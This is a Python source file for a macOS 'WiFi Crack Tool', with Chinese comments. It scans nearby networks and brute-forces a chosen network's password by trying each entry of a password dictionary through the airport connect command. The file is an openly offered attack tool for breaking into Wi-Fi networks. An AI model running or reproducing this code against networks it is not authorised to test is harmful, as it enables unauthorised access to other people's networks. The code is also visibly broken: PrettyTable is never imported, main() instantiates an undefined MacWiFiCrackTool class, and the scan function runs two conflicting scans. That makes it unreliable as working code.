# -*- coding: UTF-8 -*-
"""
WiFi Crack Tool for macOS (穷举连接,速度慢)
Author: LanYunDev
Repositories: https://github.com/LanYunDev/wifi-crack-tool
Version: Beta
"""
import os
import sys
import datetime
import time
import threading
import json
import platform
import CoreWLAN

import pyperclip
import subprocess

from PySide6.QtCore import Qt, QThread, Signal, QSize
from PySide6.QtWidgets import QApplication, QMainWindow, QFileDialog, QWidget, QMessageBox
from PySide6.QtGui import QIcon
from wifi_crack_tool_gui import Ui_MainWindow

cwlan_client = CoreWLAN.CWWiFiClient.sharedWiFiClient()
cwlan_interface = cwlan_client.interface()

class WiFiCrackTool:
    def __init__(self):
        # 配置文件、日志文件和字典文件的目录
        self.config_dir_path = os.path.join(os.getcwd(), "config")  # 配置目录路径
        self.log_dir_path = os.path.join(os.getcwd(), "log")  # 日志目录路径
        self.dict_dir_path = os.path.join(os.getcwd(), "dict")  # 字典目录路径

        # 如果这些目录不存在，则创建它们
        for path in [self.config_dir_path, self.log_dir_path, self.dict_dir_path]:
            os.makedirs(path, exist_ok=True)

        # 配置文件的路径
        self.config_file_path = os.path.join(self.config_dir_path, 'settings.json')
        
        # 默认配置
        self.config_settings_data = {
            'scan_time': 8,  # 扫描网络的时间（秒）
            'connect_time': 3,  # 尝试连接的时间（秒）
            'pwd_txt_path': 'passwords.txt'  # 默认的密码字典路径
        }

        # 加载或创建配置
        self._load_or_create_config()

        # 密码字典文件路径
        self.pwd_dict_path = os.path.join(self.dict_dir_path, 'pwdict.json')
        self.pwd_dict_data = []  # 用于存储字典数据
        self._load_pwd_dict()  # 加载密码字典

    def _load_or_create_config(self):
        """加载现有配置或创建默认配置"""
        if os.path.exists(self.config_file_path):  # 如果配置文件存在
            with open(self.config_file_path, 'r', encoding='utf-8') as config_file:
                self.config_settings_data = json.load(config_file)  # 读取配置文件
        else:  # 如果配置文件不存在，创建默认配置文件
            with open(self.config_file_path, 'w', encoding='utf-8') as config_file:
                json.dump(self.config_settings_data, config_file, indent=4)  # 写入默认配置

    def _load_pwd_dict(self):
        """加载密码字典"""
        if os.path.exists(self.pwd_dict_path):  # 如果密码字典文件存在
            with open(self.pwd_dict_path, 'r', encoding='utf-8') as json_file:
                self.pwd_dict_data = json.load(json_file)  # 读取密码字典数据

    def scan_wifi_networks(self):
        """
        使用 macOS 系统命令扫描 WiFi 网络
        
        返回:
        list: WiFi 网络名称的列表
        """
        try:
            print('\n正在扫描网络...\n')

            # 扫描网络
            scan_results, _ = cwlan_interface.scanForNetworksWithName_error_(None, None)

            # 解析扫描结果并在表格中展示
            table = PrettyTable(['编号', '名称', 'BSSID', 'RSSI', '信道', '安全性'])
            networks = []

            # 使用 system_profiler 扫描 WiFi 网络
            result = subprocess.run(['/usr/sbin/system_profiler', 'SPAirPortDataType'], 
                                    capture_output=True, text=True, timeout=10)
            
            # 解析输出以提取 WiFi 网络名称
            networks = []
            for line in result.stdout.split('\n'):
                if 'SSID' in line:  # 找到 SSID（WiFi 网络名称）行
                    network = line.split(':')[1].strip()  # 提取网络名称
                    if network and network not in networks:  # 如果网络名称有效且不重复
                        networks.append(network)
            
            return networks
        except Exception as e:
            print(f"扫描 WiFi 网络时出错: {e}")
            return []

    def attempt_wifi_connection(self, ssid, password):
        """
        尝试连接到 WiFi 网络，使用 macOS 系统命令
        
        参数:
        ssid (str): WiFi 网络名称
        password (str): WiFi 密码
        
        返回:
        bool: 如果连接成功返回 True，否则返回 False
        """
        try:
            # macOS 系统的网络设置命令
            result = subprocess.run([
                '/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport',
                '-A', ssid, 
                'password', password
            ], capture_output=True, text=True, timeout=10)
            
            # 检查是否成功连接
            return 'successfully' in result.stdout.lower()
        except Exception as e:
            print(f"连接 WiFi 时出错: {e}")
            return False

    def crack_wifi(self, ssid, password_file):
        """
        使用暴力破解尝试破解 WiFi 密码
        
        参数:
        ssid (str): WiFi 网络名称
        password_file (str): 密码字典文件路径
        
        返回:
        str 或 None: 如果找到密码返回密码，未找到则返回 None
        """
        try:
            with open(password_file, 'r', encoding='utf-8') as file:
                for line in file:  # 遍历密码字典
                    password = line.strip()  # 去除换行符
                    if self.attempt_wifi_connection(ssid, password):  # 尝试连接
                        return password  # 如果连接成功，返回密码
            return None  # 如果字典中的所有密码都无效，返回 None
        except Exception as e:
            print(f"破解 WiFi 时出错: {e}")
            return None

def main():
    # macOS 上的主应用程序逻辑
    wifi_tool = MacWiFiCrackTool()  # 创建工具实例
    
    # 示例用法：扫描可用的 WiFi 网络
    networks = wifi_tool.scan_wifi_networks()
    print("可用的 WiFi 网络:")
    for network in networks:
        print(network)
    
    # 以下部分可以取消注释并根据需要修改
    # target_network = networks[0]  # 选择第一个网络
    # password_file = wifi_tool.config_settings_data['pwd_txt_path']  # 密码字典路径
    # cracked_password = wifi_tool.crack_wifi(target_network, password_file)  # 尝试破解密码
    # if cracked_password:
    #     print(f"找到密码: {cracked_password}")
    # else:
    #     print("未能破解密码")

if __name__ == "__main__":
    main()